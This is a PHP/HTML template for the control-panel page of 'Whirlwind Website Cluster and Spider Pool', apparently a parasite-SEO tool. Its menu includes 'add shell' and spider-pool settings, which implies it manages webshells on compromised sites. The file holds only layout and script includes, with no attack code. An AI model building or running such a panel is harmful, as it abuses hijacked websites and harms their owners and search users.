<?php if (!defined('THINK_PATH')) exit();?><!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <link rel="stylesheet" type="text/css" href="/寄生蟲/Public/bootstrap/css/bootstrap.min.css">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>
        <?php echo ((isset($title) && ($title !== ""))?($title):'控制台-whirlwind寄生虫站群蜘蛛池'); ?>
    </title>
    <meta keywords="<?php echo ((isset($keywords) && ($keywords !== ""))?($keywords):''); ?>">
    <meta name="description" content="<?php echo ((isset($description) && ($description !== ""))?($description):''); ?>">
    <meta name="author" content="<?php echo ((isset($author) && ($author !== ""))?($author):'Whirlwind'); ?>">
    <link rel="stylesheet" type="text/css" href="/寄生蟲/Public/css/index.css">
    <script>
    var CONTROLLER = "/寄生蟲/Home/Index";
    </script>
</head>

<body>
    <div class="container-fluid" id="body">


<nav class="col-sm-2 col-sm-offset-1">
    <div class="list-group">
        <a href="#showshell" class="list-group-item active" id="showshella">控制台</a>
        <a href="#addshell" class="list-group-item" id="addshella">添加shell</a>
        <a href="#pool" class="list-group-item" id="poola">蜘蛛池设置</a>
        <a href="#spidercount" class="list-group-item" id="spidercounta">蜘蛛统计</a>
    </div>
    <div id="info">
        <p>运行状态：</p>
        <div id="info_now">
            <p>
                <?php echo ($time); ?>系统启动
            </p>
        </div>
    </div>
</nav>
<div id="right" class="right col-sm-8">
</div>

<div class="col-xs-6 col-xs-offset-3">
Whirlwind Website Cluster and Spider Pool(WWCSP) v2.0 alpha Mail:wind#fbi.org.in
</div>
</div>
<!-- Bootstrap core JavaScript
    ================================================== -->
<!-- Placed at the end of the document so the pages load faster -->
<script src="/寄生蟲/Public/js/jquery.js"></script>
<script type="text/javascript" src="/寄生蟲/Public/bootstrap/js/bootstrap.min.js"></script>
<!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
<script type="text/javascript" src="/寄生蟲/Public/js/ie10-viewport-bug-workaround.js"></script>
<script type="text/javascript" src="/寄生蟲/Public/js/index.js"></script>
<script type="text/javascript" src="/寄生蟲/Public/js/Chart.js"></script>
</body>

</html>